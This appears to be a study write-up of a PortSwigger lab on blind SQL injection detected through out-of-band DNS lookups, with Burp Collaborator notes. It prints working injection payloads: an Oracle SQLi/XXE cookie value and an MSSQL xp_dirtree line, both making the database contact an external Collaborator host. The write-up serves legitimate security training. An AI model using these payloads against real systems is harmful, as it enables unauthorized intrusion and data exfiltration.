# Lab: Blind SQL injection with out-of-band interaction

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.

> **Note**
To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.
> 

### **Hint**

You can find some useful payloads on our SQL injection cheat sheet.

### **Solution**

1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie.
    
    ![2025-05-22_03-12_1.png](Lab%20Img/2025-05-22_03-12_1.png)
    
    ![2025-05-22_03-13.png](Lab%20Img/2025-05-22_03-13.png)
    
2. First, open Burp Collaborator and click on **Get Started** to generate a unique Burp Collaborator subdomain. Use this subdomain to perform the attack. If the target application is vulnerable, it will trigger a DNS lookup to the Burp Collaborator server. This DNS interaction confirms the presence of the vulnerability.
    
    **Collaborator:** a person who works jointly on an activity or project; an associate.
    ---
    - ## Burp Collaborator
        
        ## 🔍 What is Burp Collaborator?
        
        **Burp Collaborator** is an **Out-of-Band Application Security Testing (OAST)** tool. It enables you to identify vulnerabilities like **blind SQL injection**, **server-side request forgery (SSRF)**, and **out-of-band XSS**, where traditional testing methods might fail due to the lack of direct feedback from the application.
        
        ---
        
        ## ⚙️ How Does It Work?
        
        1. **Generate a Collaborator Payload**: Burp creates a unique subdomain (e.g., `abc123.burpcollaborator.net`) that you can insert into your test requests.
        2. **Inject the Payload into the Target Application**: Place the payload in a parameter, header, or any input field that the application processes.
        3. **Monitor for Interactions**: Burp Collaborator listens for any DNS, HTTP, or SMTP requests made to the generated subdomain, indicating that the payload was executed.
        
        ![image.png](Lab%20Img/Burp%20Collaborator/image.png)
        
        ---
        
        ## 🛠️ Step-by-Step Guide to Using Burp Collaborator
        
        ### 1. **Access the Target Application**
        
        - Use Burp's embedded browser to navigate to the application you want to test.
        
        ### 2. **Identify an Interesting Request**
        
        - In Burp's **Proxy > HTTP history** tab, locate a request that you suspect might be vulnerable.
        - Right-click on the request and select **"Send to Repeater"**.
        
        ### 3. **Insert a Collaborator Payload**
        
        - In the **Repeater** tab, identify a suitable location in the request (e.g., a header or parameter).
        - Right-click on the selected area and choose **"Insert Collaborator payload"**.
        - This action replaces the selected text with a unique Collaborator
        
        ### 4. **Send the Modified Request**
        
        - Click **"Send"** in the Repeater tab to dispatch the request to the target application.
        
        ### 5. **Poll for Interactions**
        
        - Navigate to the **Collaborator** tab in Burp Suite.
        - Burp automatically polls the Collaborator server every 60 seconds.
        - To check immediately, click **"Poll now"**.
        - If the application interacted with the payload, you'll see entries indicating DNS or HTTP requests to your Collaborator subdomain.
        
        ---
        
        ## 📊 Analyzing Collaborator Interactions
        
        - **Filtering**: Use the buttons to filter interactions by protocol (HTTP, DNS, SMTP).
        - **Searching**: Click on **"Search"** to find specific interactions.
        - **Annotating**: Right-click on an interaction to add comments or highlights.
        - **Exporting**: Right-click and select **"Export as CSV"** to save interactions for reporting.
        
        ---
        
        ## 🔐 Using a Private Collaborator Server
        
        For environments with strict security requirements or limited internet access, you can deploy a private instance of the Collaborator server.
        
        ### Steps to Deploy:
        
        1. **Set Up a Domain and DNS Records**: Configure a domain (e.g., `collaborator.example.com`) with appropriate DNS records pointing to your server.
        2. **Configure the Server**: Set up the Collaborator server to handle DNS, HTTP, and SMTP requests.
        3. **Adjust Burp Settings**: In Burp Suite, navigate to **Project > Collaborator** settings and specify your private server's details.
        
        ---
        
        ## 🧪 Practical Example: Detecting Blind SQL Injection
        
        Imagine a scenario where a web application's input field is vulnerable to SQL injection, but it doesn't return any errors or data. You can:
        
        1. **Generate a Collaborator Payload**: Obtain a unique subdomain from Burp Collaborator.
        2. **Craft a Malicious Input**: Insert the payload into the input field, such as:
            
            ```sql
            sql
            '; exec master..xp_dirtree '\\abc123.burpcollaborator.net\share'--
            ```
            
        3. **Send the Request**: Submit the input to the application.
        4. **Monitor Collaborator**: If the application is vulnerable, the database server will attempt to access the specified subdomain, which Burp Collaborator will detect.
        
        ---
        
        ## 📘 Additional Resources
        
        - **Burp Collaborator Documentation**: Detailed information on using and configuring Burp Collaborator.
        - **Getting Started with Burp Collaborator**: A step-by-step tutorial to help you begin using Collaborator effectively.
    
    - ## Burp Collaborator **Step-by-Step Walkthrough**
        
        ## 🧪 Step-by-Step Tutorial Overview
        
        ### **1️⃣. Access the Lab Environment**
        
        - Open Burp's embedded browser and navigate to the Lab:
        - Click on **"Access the lab"** and log in to your PortSwigger account if prompted. This will launch a deliberately vulnerable shopping website for testing purposes.
        
        ### **2️⃣. Explore the Target Site**
        
        - Within the browser, click on various product pages to generate traffic and populate Burp's HTTP history.
        
        ### **3️⃣. Send a Request to Repeater**
        
        - In Burp Suite, go to the **Proxy > HTTP history** tab.
        - Locate a `GET /product?productId=...` request.
        - Right-click on this request and select **"Send to Repeater"**.
        
        ### **4️⃣. Inject a Collaborator Payload**
        
        - Switch to the **Repeater** tab.
        - In the request headers, find the `Referer` header.
        - Highlight the URL in the `Referer` header, right-click, and choose **"Insert Collaborator payload"**. This action replaces the existing URL with a unique Collaborator subdomain, such as:
            
            `204119i326shak9tnk6k36z8jlahj74r.oastify.com`
            
        - Click **"Send"** to dispatch the modified request to the server.
        
        ### **5️⃣. Poll for Interactions**
        
        - Navigate to the **Collaborator** tab in Burp Suite.
        - Burp automatically polls the Collaborator server every 60 seconds. To check immediately, click **"Poll now"**.
        - If the application processed the payload and made a request to the Collaborator server, you'll see entries indicating DNS or HTTP interactions.
        - Click on an interaction to view detailed information about the request.
        
        ---
        
        ## ✅ Summary
        
        By following these steps, you've:
        
        - Generated a unique Collaborator payload.
        - Inserted the payload into a request to the target application.
        - Detected an out-of-band interaction resulting from the application's processing of the payload.
        
        > This process demonstrates how Burp Collaborator can be used to identify vulnerabilities that don't produce immediate or visible responses, such as blind SSRF.
        > 
    
    ![2025-05-22_03-13_1.png](Lab%20Img/2025-05-22_03-13_1.png)
    
3. Modify the `TrackingId` cookie,
changing it to a payload that will trigger an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:
    
    ```sql
    TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
    ```
    
    ![2025-05-22_03-14.png](Lab%20Img/2025-05-22_03-14.png)
    
    ![2025-05-22_03-16.png](Lab%20Img/2025-05-22_03-16.png)
    

1. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified `TrackingId` cookie.
    
    ![2025-05-22_03-22.png](Lab%20Img/2025-05-22_03-22.png)
    
    ![2025-05-22_03-24.png](Lab%20Img/2025-05-22_03-24.png)
    
    ![2025-05-22_03-24_1.png](Lab%20Img/2025-05-22_03-24_1.png)
    

The solution described here is sufficient simply to trigger a DNS lookup and so solve the lab. In a real-world situation, you would use Burp Collaborator to verify that your payload had indeed 
triggered a DNS lookup and potentially exploit this behavior to exfiltrate sensitive data from the application. We'll go over this technique in the next lab.

### **Community solutions**

> [https://youtu.be/-t4cr5uRzzA](https://youtu.be/-t4cr5uRzzA)
>
